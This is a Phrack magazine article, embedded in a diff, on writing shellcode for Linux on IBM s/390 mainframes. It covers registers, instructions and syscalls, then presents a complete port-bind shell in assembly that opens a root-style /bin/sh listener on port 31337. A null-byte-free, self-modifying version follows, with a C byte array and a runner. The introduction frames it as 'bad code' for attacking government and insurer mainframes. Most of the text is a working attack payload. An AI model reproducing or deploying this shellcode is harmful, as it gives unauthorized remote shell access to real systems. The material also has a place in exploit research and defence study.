@@ -1,0 +1,496 @@
+                             ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x3b, Phile #0x0d of 0x12
+
+|=----------------=[ Linux/390 shellcode development ]=------------------=|
+|=-----------------------------------------------------------------------=|
+|=-------------=[ johnny cyberpunk <jcyberpunk@thc.org> ]=---------------=|
+
+
+--[ Contents
+
+  1 - Introduction
+
+  2 - History and facts
+    2.1 - Registers
+    2.2 - Instruction set
+    2.3 - Syscalls
+    2.4 - The native code
+    2.5 - Avoiding the evil 0x00 and 0x0a
+    2.6 - The final code
+
+  3 - References
+
+
+
+--[ 1 - Introduction
+
+    Since Linux/390 has been released by IBM more and more b0xes of this
+type can be found in the wild. A good reason for a hacker to get a closer
+look on how vulnerable services can be exploited on a mainframe. Remember,
+who are the owners of mainframes ? Yeah, big computer centres, insurances
+or goverments. Well, in this article I'll uncover how to write the bad code
+(aka shellcode). The bind-shellcode at the end should be taken as an 
+example. Other shellcode and exploit against some known vulnerabilities can
+be found on a seperate link (see References) in the next few weeks.
+
+    Suggestions, improvements or flames can be send directly to the email
+address posted in the header of this article. My gpg-key can be found at
+the document bottom.
+
+
+--[ 2 - History and facts
+
+    In late 1998 a small team of IBM developers from Boeblingen/Germany
+started to port Linux to mainframes. One year later in December 1999 the
+first version has been published for the IBM s/390. There are two versions
+available:
+
+    A 32 bit version, referred to as Linux on s/390 and a 64 bit version, 
+referred to as Linux on zSeries. Supported distros are Suse, Redhat and
+TurboLinux. Linux for s/390 is based on the kernel 2.2, the zSeries is
+based on kernel 2.4. There are different ways to run Linux:
+
+Native       - Linux runs on the entire machine, with no other OS
+LPAR         - Logical PARtition): The hardware can be logically
+               partitioned, for example, one LPAR hosts a VM/VSE
+               environment and another LPAR hosts Linux. 
+VM/ESA Guest - means that a customer can also run Linux in a virtual
+               machine
+
+The binaries are in ELF format (big endianess).
+
+
+
+
+----[ 2.1 - Registers
+
+    For our shellcode development we really don't need the whole bunch of
+registers the s/390 or zSeries has. The most interesting for us are the
+registers %r0-%r15. Anyway I'll list some others here for to get an
+overview.
+
+General propose registers        : 
+        %r0-%r15 or gpr0-gpr15 are used for addressing and arithmetic
+        
+Control registers                : 
+        cr0-cr15 are only used by kernel for irq control, memory
+        management, debugging control ...
+        
+Access registers                 :
+        ar0-ar15 are normally not used by programs, but good for 
+        temporary storage
+        
+Floating point registers        :
+        fp0-fp15 are IEEE and HFP floating ( Linux only uses IEEE )
+        
+PSW ( Programm Status Word )        :
+        is the most important register and serves the roles of a program
+        counter, memory space designator and condition code register.
+        For those who wanna know more about this register, should take
+        a closer look on the references at the bottom.
+        
+
+
+        
+----[ 2.2 - Instruction set
+
+Next I'll show you some useful instructions we will need, while developing
+our shellcode.
+
+
+Instruction                        Example
+---------------------------------------------------------------------------
+basr (branch and save)        %r1,0               # save value 0 to %r1
+lhi  (load h/word immediate)  lhi %r4,2           # load value 2 into %r4
+la   (load address)           la %r3,120(%r15)    # load address from
+                                                  # %r15+120 into %r3
+lr   (load register)          lr %r4,%r9          # load value from %r9
+                                                  # into %r4
+stc  (store character)        stc %r6,120(%r15)   # store 1 character from
+                                                  # %r6 to %r15+120
+sth  (store halfword)         sth %r3,122(%r15)   # store 2 bytes from
+                                                  # %r3 to %r15+122
+ar   (add)                    ar %r6,%r10         # add value in %r10 ->%r6
+xr   (exclusive or)           xr %r2,%r2          # 0x00 trick :)
+svc  (service call)           svc 1               # exit
+
+
+
+
+----[ 2.3 - Syscalls
+
+    On Linux for s/390 or zSeries syscalls are done by using the
+instruction SVC with it's opcode 0x0a ! This is no good message for
+shellcoders, coz 0x0a is a special character in a lot of services. But
+before i start explaining how we can avoid using this call let's have a
+look on how our OS is using the syscalls.
+
+    The first four parameters of a syscall are delivered to the registers
+%r2-%r5 and the resultcode can be found in %r2 after the SVC call.
+
+Example of an execve call:
+
+        basr	  %r1,0
+base:
+        la        %r2,exec-base(%r1)
+        la        %r3,arg-base(%r1)
+        la        %r4,tonull-base(%r1)
+        svc     11
+
+exec:
+        .string  "/bin//sh"
+arg:        
+        .long   exec 
+tonull:
+        .long   0x0
+        
+
+    A special case is the SVC call 102 (SYS_SOCKET). First we have to feed
+the register %r2 with the desired function ( socket, bind, listen, accept, 
+....) and %r3 points to a list of parameters this function needs. Every
+parameter in this list has its own u_long value.
+
+And again an example of a socket() call :
+
+        lhi        %r2,2                # domain
+        lhi        %r3,1                # type
+        xr         %r4,%r4              # protocol
+        stm        %r2,%r4,128(%r15)    # store %r2 - %r4
+        lhi        %r2,1                # function socket()
+        la         %r3,128(%r15)        # pointer to the API values
+        svc        102                  # SOCKETCALL
+        lr         %r7,%r2              # save filedescriptor to %r7
+
+        
+
+
+        
+----[ 2.4 - The native code
+
+So now, here is a sample of a complete portbindshell in native style :
+
+        .globl _start
+        
+_start:
+        basr       %r1,0                     # our base-address
+base:
+
+        lhi        %r2,2                     # AF_INET
+        sth        %r2,120(%r15)
+        lhi        %r3,31337                 # port
+        sth        %r3,122(%r15)
+        xr         %r4,%r4                   # INADDR_ANY
+        st         %r4,124(%r15)             # 120-127 is struct sockaddr *
+        lhi        %r3,1                     # SOCK_STREAM
+        stm        %r2,%r4,128(%r15)         # store %r2-%r4, our API values
+        lhi        %r2,1                     # SOCKET_socket
+        la         %r3,128(%r15)             # pointer to the API values
+        svc        102                       # SOCKETCALL 
+        lr         %r7,%r2                   # save socket fd to %r7
+        la         %r3,120(%r15)             # pointer to struct sockaddr *
+        lhi        %r9,16                    # save value 16 to %r9
+        lr         %r4,%r9                   # sizeof address
+        stm        %r2,%r4,128(%r15)         # store %r2-%r4, our API values
+        lhi        %r2,2                     # SOCKET_bind
+        la         %r3,128(%r15)             # pointer to the API values
+        svc        102                       # SOCKETCALL
+        lr         %r2,%r7                   # get saved socket fd
+        lhi        %r3,1                     # MAXNUMBER
+        stm        %r2,%r3,128(%r15)         # store %r2-%r3, our API values
+        lhi        %r2,4                     # SOCKET_listen
+        la         %r3,128(%r15)             # pointer to the API values
+        svc        102                       # SOCKETCALL
+        lr         %r2,%r7                   # get saved socket fd
+        la         %r3,120(%r15)             # pointer to struct sockaddr *
+        stm        %r2,%r3,128(%r15)         # store %r2-%r3,our API values
+        st         %r9,136(%r15)             # %r9 = 16, this case: fromlen
+        lhi        %r2,5                     # SOCKET_accept
+        la         %r3,128(%r15)             # pointer to the API values
+        svc        102                       # SOCKETCALL
+        xr         %r3,%r3                   # the following shit
+        svc        63                        # duplicates stdin, stdout
+        ahi        %r3,1                     # stderr
+        svc        63                        # DUP2
+        ahi        %r3,1                        
+        svc        63                        
+        la         %r2,exec-base(%r1)        # point to /bin/sh
+        la         %r3,arg-base(%r1)         # points to address of /bin/sh
+        la         %r4,tonull-base(%r1)      # point to envp value
+        svc        11                        # execve
+        slr        %r2,%r2                        
+        svc        1                         # exit
+        
+exec:
+        .string  "/bin//sh"
+arg:
+        .long   exec
+tonull:
+        .long   0x0                
+
+
+
+
+----[ 2.5 - Avoiding 0x00 and 0x0a
+
+    To get a clean working shellcode we have two things to bypass. First
+avoiding 0x00 and second avoiding 0x0a.
+
+Here is our first case :
+
+a7 28 00 02             lhi     %r2,02
+
+And here is my solution :
+
+a7 a8 fb b4             lhi     %r10,-1100
+a7 28 04 4e             lhi     %r2,1102
+1a 2a                   ar      %r2,%r10
+
+    I statically define a value -1100 in %r10 to use it multiple times.
+After that i load my wanted value plus 1100 and in the next instruction
+the subtraction of 1102-1100 gives me the real value. Quite easy.
+
+To get around the next problem we have to use selfmodifing code:
+
+svc:
+        .long 0x0b6607fe          <---- will be svc 66, br %r14 after
+                                        code modification
+
+    Look at the first byte, it has the value 0x0b at the moment. The
+following code changes this value to 0x0a:
+
+basr      %r1,0                   # our base-address
+la        %r9,svc-base(%r1)       # load address of svc subroutine
+lhi       %r6,1110                # selfmodifing
+lhi       %r10,-1100              # code is used 
+ar        %r6,%r10                # 1110 - 1100 = \x0a opcode SVC
+stc       %r6,svc-base(%r1)       # store svc opcode
+
+Finally the modified code looks as follows :
+
+0a 66                svc 66
+07 fe                br %r14
+
+To branch to this subroutine we use the following command :
+
+basr        	     %r14,%r9     # branch to subroutine SVC 102
+
+    The Register %r9 has the address of the subroutine and %r14 contains
+the address where to jump back.
+
+
+
+
+----[ 2.6 - The final code
+
+Finally we made it, our shellcode is ready for a first test:
+
+        .globl _start
+        
+_start:
+        basr      %r1,0                   # our base-address
+base:
+        la        %r9,svc-base(%r1)       # load address of svc subroutine
+        lhi       %r6,1110                # selfmodifing
+        lhi       %r10,-1100              # code is used 
+        ar        %r6,%r10                # 1110 - 1100 = \x0a opcode SVC
+        stc       %r6,svc-base(%r1)       # store svc opcode 
+        lhi       %r2,1102                # portbind code always uses
+        ar        %r2,%r10                # real value-1100 (here AF_INET)
+        sth       %r2,120(%r15)
+        lhi       %r3,31337               # port
+        sth       %r3,122(%r15)
+        xr        %r4,%r4                 # INADDR_ANY
+        st        %r4,124(%r15)           # 120-127 is struct sockaddr *
+        lhi       %r3,1101                # SOCK_STREAM
+        ar        %r3,%r10
+        stm       %r2,%r4,128(%r15)       # store %r2-%r4, our API values
+        lhi       %r2,1101                # SOCKET_socket
+        ar        %r2,%r10
+        la        %r3,128(%r15)           # pointer to the API values
+        basr      %r14,%r9                # branch to subroutine SVC 102
+        lr        %r7,%r2                 # save socket fd to %r7
+        la        %r3,120(%r15)           # pointer to struct sockaddr *
+        lhi       %r8,1116                
+        ar        %r8,%r10                # value 16 is stored in %r8
+        lr        %r4,%r8                 # size of address
+        stm       %r2,%r4,128(%r15)       # store %r2-%r4, our API values
+        lhi       %r2,1102                # SOCKET_bind
+        ar        %r2,%r10
+        la        %r3,128(%r15)           # pointer to the API values
+        basr      %r14,%r9                # branch to subroutine SVC 102
+        lr        %r2,%r7                 # get saved socket fd
+        lhi       %r3,1101                # MAXNUMBER
+        ar        %r3,%r10
+        stm       %r2,%r3,128(%r15)       # store %r2-%r3, our API values
+        lhi       %r2,1104                # SOCKET_listen
+        ar        %r2,%r10
+        la        %r3,128(%r15)           # pointer to the API values
+        basr      %r14,%r9                # branch to subroutine SVC 102
+        lr        %r2,%r7                 # get saved socket fd
+        la        %r3,120(%r15)           # pointer to struct sockaddr *
+        stm       %r2,%r3,128(%r15)       # store %r2-%r3, our API values
+        st        %r8,136(%r15)           # %r8 = 16, in this case fromlen
+        lhi       %r2,1105                # SOCKET_accept
+        ar        %r2,%r10
+        la        %r3,128(%r15)           # pointer to the API values
+        basr      %r14,%r9                # branch to subroutine SVC 102
+        lhi       %r6,1163                # initiate SVC 63 = DUP2
+        ar        %r6,%r10
+        stc       %r6,svc+1-base(%r1)        # modify subroutine to SVC 63
+        lhi       %r3,1102                # the following shit
+        ar        %r3,%r10                # duplicates
+        basr      %r14,%r9                # stdin, stdout
+        ahi       %r3,-1                        # stderr
+        basr      %r14,%r9                # SVC 63 = DUP2
+        ahi       %r3,-1
+        basr      %r14,%r9
+        lhi       %r6,1111                # initiate SVC 11 = execve
+        ar        %r6,%r10
+        stc       %r6,svc+1-base(%r1)     # modify subroutine to SVC 11
+        la        %r2,exec-base(%r1)      # point to /bin/sh
+        st        %r2,exec+8-base(%r1)    # save address to /bin/sh
+        la        %r3,exec+8-base(%r1)    # points to address of /bin/sh
+        xr        %r4,%r4                 # 0x00 is envp
+        stc       %r4,exec+7-base(%r1)    # fix last byte /bin/sh\\ to 0x00
+        st        %r4,exec+12-base(%r1)   # store 0x00 value for envp
+        la        %r4,exec+12-base(%r1)   # point to envp value
+        basr      %r14,%r9                # branch to subroutine SVC 11
+svc:
+        .long 0x0b6607fe                  # our subroutine SVC n + br %r14
+exec:
+        .string  "/bin/sh\\"
+        
+
+In a C-code environment it looks like this :
+
+char shellcode[]=
+"\x0d\x10"		/* basr    %r1,%r0				*/
+"\x41\x90\x10\xd4"	/* la      %r9,212(%r1)				*/
+"\xa7\x68\x04\x56"	/* lhi     %r6,1110				*/
+"\xa7\xa8\xfb\xb4"	/* lhi     %r10,-1100				*/
+"\x1a\x6a"		/* ar      %r6,%r10				*/
+"\x42\x60\x10\xd4"	/* stc     %r6,212(%r1)				*/
+"\xa7\x28\x04\x4e"	/* lhi     %r2,1102				*/
+"\x1a\x2a"		/* ar      %r2,%r10				*/
+"\x40\x20\xf0\x78"	/* sth     %r2,120(%r15)			*/
+"\xa7\x38\x7a\x69"	/* lhi     %r3,31337				*/
+"\x40\x30\xf0\x7a"	/* sth     %r3,122(%r15)			*/
+"\x17\x44"		/* xr      %r4,%r4				*/
+"\x50\x40\xf0\x7c"	/* st      %r4,124(%r15)			*/
+"\xa7\x38\x04\x4d"	/* lhi     %r3,1101				*/
+"\x1a\x3a"		/* ar      %r3,%r10				*/
+"\x90\x24\xf0\x80"	/* stm     %r2,%r4,128(%r15)			*/
+"\xa7\x28\x04\x4d"	/* lhi     %r2,1101				*/
+"\x1a\x2a"		/* ar      %r2,%r10				*/
+"\x41\x30\xf0\x80"	/* la      %r3,128(%r15)			*/
+"\x0d\xe9"		/* basr    %r14,%r9				*/
+"\x18\x72"		/* lr      %r7,%r2				*/
+"\x41\x30\xf0\x78"	/* la      %r3,120(%r15)			*/
+"\xa7\x88\x04\x5c"	/* lhi     %r8,1116				*/
+"\x1a\x8a"		/* ar      %r8,%r10				*/
+"\x18\x48"		/* lr      %r4,%r8				*/
+"\x90\x24\xf0\x80"	/* stm     %r2,%r4,128(%r15)			*/
+"\xa7\x28\x04\x4e"	/* lhi     %r2,1102				*/
+"\x1a\x2a"		/* ar      %r2,%r10				*/
+"\x41\x30\xf0\x80"	/* la      %r3,128(%r15)			*/
+"\x0d\xe9"		/* basr    %r14,%r9				*/
+"\x18\x27"		/* lr      %r2,%r7				*/
+"\xa7\x38\x04\x4d"	/* lhi     %r3,1101				*/
+"\x1a\x3a"		/* ar      %r3,%r10				*/
+"\x90\x23\xf0\x80"	/* stm     %r2,%r3,128(%r15)			*/
+"\xa7\x28\x04\x50"	/* lhi     %r2,1104				*/
+"\x1a\x2a"		/* ar      %r2,%r10				*/
+"\x41\x30\xf0\x80"	/* la      %r3,128(%r15)			*/
+"\x0d\xe9"		/* basr    %r14,%r9				*/
+"\x18\x27"		/* lr      %r2,%r7				*/
+"\x41\x30\xf0\x78"	/* la      %r3,120(%r15)			*/
+"\x90\x23\xf0\x80"	/* stm     %r2,%r3,128(%r15)			*/
+"\x50\x80\xf0\x88"	/* st      %r8,136(%r15)			*/
+"\xa7\x28\x04\x51"	/* lhi     %r2,1105				*/
+"\x1a\x2a"		/* ar      %r2,%r10				*/
+"\x41\x30\xf0\x80"	/* la      %r3,128(%r15)			*/
+"\x0d\xe9"		/* basr    %r14,%r9				*/
+"\xa7\x68\x04\x8b"	/* lhi     %r6,1163				*/
+"\x1a\x6a"		/* ar      %r6,%r10				*/
+"\x42\x60\x10\xd5"	/* stc     %r6,213(%r1)				*/
+"\xa7\x38\x04\x4e"	/* lhi     %r3,1102				*/
+"\x1a\x3a"		/* ar      %r3,%r10				*/
+"\x0d\xe9"		/* basr    %r14,%r9				*/
+"\xa7\x3a\xff\xff"	/* ahi     %r3,-1				*/
+"\x0d\xe9"		/* basr    %r14,%r9				*/
+"\xa7\x3a\xff\xff"	/* ahi     %r3,-1				*/
+"\x0d\xe9"		/* basr    %r14,%r9				*/
+"\xa7\x68\x04\x57"	/* lhi     %r6,1111				*/
+"\x1a\x6a"		/* ar      %r6,%r10				*/
+"\x42\x60\x10\xd5"	/* stc     %r6,213(%r1)				*/
+"\x41\x20\x10\xd8"	/* la      %r2,216(%r1)				*/
+"\x50\x20\x10\xe0"	/* st      %r2,224(%r1)				*/
+"\x41\x30\x10\xe0"	/* la      %r3,224(%r1)				*/
+"\x17\x44"		/* xr      %r4,%r4				*/
+"\x42\x40\x10\xdf"	/* stc     %r4,223(%r1)				*/
+"\x50\x40\x10\xe4"	/* st      %r4,228(%r1)				*/
+"\x41\x40\x10\xe4"	/* la      %r4,228(%r1)				*/
+"\x0d\xe9"		/* basr    %r14,%r9				*/
+"\x0b\x66"		/* svc	   102 		<--- after modification	*/
+"\x07\xfe"		/* br      %r14					*/
+"\x2f\x62\x69\x6e"	/* /bin						*/
+"\x2f\x73\x68\x5c";	/* /sh\						*/
+
+main()
+{
+ void (*z)()=(void*)shellcode;
+ z();
+}
+
+
+
+
+--[ 3 - References:
+
+
+[1] z/Architecture Principles of Operation (SA22-7832-00) 
+    http://publibz.boulder.ibm.com/epubs/pdf/dz9zr000.pdf
+
+[2] Linux for S/390 ( SG24-4987-00 )
+    http://www.redbooks.ibm.com/pubs/pdfs/redbooks/sg244987.pdf
+
+[3] LINUX for S/390 ELF Application Binary Interface Supplement
+    http://oss.software.ibm.com/linux390/docu/l390abi0.pdf
+
+[4] Example exploits
+    http://www.thc.org/misc/sploits/
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: GnuPG v1.0.6 (GNU/Linux)
+Comment: Weitere Infos: siehe http://www.gnupg.org
+
+mQGiBDzw5yMRBACGJ1o25Bfbb6mBkP2+qwd0eCTvCmC5uJGdXWOW8BbQwDHkoO4h
+sdouA+0JdlTFIQriCZhZWbspNsWEpXPOAW8vG3fSqIUqiDe6Aj21h+BnW0WEqx9t
+8TkooEVS3SL34wiDCig3cQtmvAIj0C9g4pj5B/QwHJYrWNFoAxc2SW1lXwCg8Wk9
+LawvHW+Xqnc6n/w5Oo8IpNsD/2Lp4fvQFiTvN22Jd63nCQ75A64fB7mH7ZUsVPYy
+BctYXM4GhcHx7zfOhAbJQNWoNmYGiftVr9UvO9GSnG+Y9jq6I16qOn7T7dIZUEpL
+F5FevEFTyrtDGYmBhGv9hwtbz3CI9n9gpZxz1xYTbDHxkVIiTMlcNR3GIJRPfo5B
+a7u4A/9ncKqRx2HbRkaj39zugC6Y28z9lSimGzu7PTVw3bxDbObgi4CyHcjnHe+j
+DResuKGgdyEf+d07ofbFEOdQjgaDx1mmswS4pcILKOyRdQMtdbgSdyPlJw5KGHLX
+G0hrHV/Uhgok3W6nC43ZvPWbd3HVfOIU8jDTRgWaRDjGc45dtbQkam9obm55IGN5
+YmVycHVuayA8am9obmN5YnBrQGdteC5uZXQ+iFcEExECABcFAjzw5yMFCwcKAwQD
+FQMCAxYCAQIXgAAKCRD3c5EGutq/jMW7AJ9OSmrB+0vMgPfVOT4edV7C++RNHwCf
+byT/qKeSawxasF8g4HeX33fSPe25Ag0EPPDnrRAIALdcTn8E2Z8Z4Ua4p8fjwXNO
+iP6GOANUN5XLpmscv9v5ErPfK+NM2ARb7O7rQJfLkmKV8voPNj4lPUUyltGeOhzj
+t86I5p68RRSvO5JKTW+riZamaD8lB84YqLzmt9OuzuOeAJCq3GuQtPMyrNuOkPL9
+nX51EgnLnYaUYAkysAhYLhlrye/3maNdjtn2T63MoJauAoB4TpKvegsGsf1pA5mj
+y9fuG6zGnWt8XpVSdD2W3PUJB+Q7J3On35byebIKiuGsti6Y5L0ZSDlW2rveZp9g
+eRSQz06j+mxAooTUMBBJwMmXjHm5nTgr5OX/8mpb+I73MGhtssRr+JW+EWSLQN8A
+AwcH/iqRCMmPB/yiMhFrEPUMNBsZOJ+VK3PnUNLbAPtHz7E2ZmEpTgdvLR3tjHTC
+vZO6k40H1BkodmdFkCHEwzhWwe8P3a+wgW2LnPCM6tfPEfp9kPXD43UlTLWLL4RF
+cPmyrs45B2uht7aE3Pe0SgbsnWAej87Stwb+ezOmngmrRvZKnYREVR1RHRRsH3l6
+C4rexD3uHjFNdEXieW97xHG71YpOVDX6slCK2SumfxzQAEZC2n7/DqwPd6Z/abAf
+Ay9WmTpqBFd2FApUtZ1h8cpS6MYb6A5R2BDJQl1hN2pQFNzIh8chjVdQc67dKiay
+R/g0Epg0thiVAecaloCJlJE8b3OIRgQYEQIABgUCPPDnrQAKCRD3c5EGutq/jNuP
+AJ979IDls926vsxlhRA5Y8G0hLyDAwCgo8eWQWI7Y+QVfwBG8XCzei4oAiI=
+=2B7h
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+|=[ EOF ]=---------------------------------------------------------------=|
